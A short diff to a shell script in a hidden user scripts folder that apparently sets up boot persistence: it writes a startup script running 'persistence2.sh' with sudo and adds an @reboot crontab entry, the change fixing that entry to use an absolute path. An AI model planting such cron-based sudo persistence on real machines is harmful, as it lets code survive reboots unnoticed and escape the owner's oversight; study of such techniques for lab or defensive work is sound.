@@ -10,6 +10,6 @@ cd /home/resch/.scripts
 echo "sudo /home/resch/.scripts/persistence2.sh" > startup_scripts.sh
 chmod +x ./startup_scripts.sh
 # adding startup script to cron
-(crontab -l ; echo "@reboot ./startup_scripts.sh")| crontab -
+(crontab -l ; echo "@reboot /home/resch/.scripts/startup_scripts.sh")| crontab -
 
 echo "[+] Done."
